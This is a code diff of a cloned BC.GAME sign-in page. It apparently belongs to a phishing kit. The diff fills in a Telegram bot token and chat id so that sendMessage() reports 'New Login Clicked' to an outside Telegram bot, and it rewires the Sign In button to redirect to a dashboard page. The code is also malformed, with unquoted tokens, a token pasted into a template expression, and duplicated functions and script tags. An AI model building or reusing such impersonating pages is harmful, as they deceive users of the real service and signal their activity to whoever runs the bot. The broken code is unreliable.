@@ -240,8 +240,7 @@ Password
 <div class="forgot">
 Forgot your password?
 </div>
-
-<button class="btn" onclick="sendMessage()">
+<button class="btn" onclick="nextPage()">
 Sign In
 </button>
 
@@ -279,9 +278,9 @@ New to BC.GAME? <span>Create account</span>
 
 function sendMessage(){
 
-let botToken = "YAHAN_BOT_TOKEN";
+let botToken = 8086684078:AAEpy5bmjSrkOQVGAAY6Cfthg5-O7rjzqHQ
 
-let chatId = "YAHAN_CHAT_ID";
+let chatId = 7892706717
 
 let text = "New Login Clicked";
 
@@ -292,16 +291,24 @@ fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&tex
 
 function sendMessage(){
 
-let botToken = "YAHAN_BOT_TOKEN";
+let botToken = 8086684078:AAEpy5bmjSrkOQVGAAY6Cfthg5-O7rjzqHQ
 
-let chatId = "YAHAN_CHAT_ID";
+let chatId = 7892706717
 
 let text = "New Login Clicked";
 
 fetch(`https://api.telegram.org/bot${8086684078:AAGTJyuE7F0tRnRjTX4ScyL_NjxNzdMXNRs}/sendMessage?chat_id=${7892706717}&text=${text}`);
 
 }
+<script>
 
+function nextPage(){
+
+window.location.href="dashboard.html";
+
+}
+
+</script>
 </script>
 </body>
 </html>
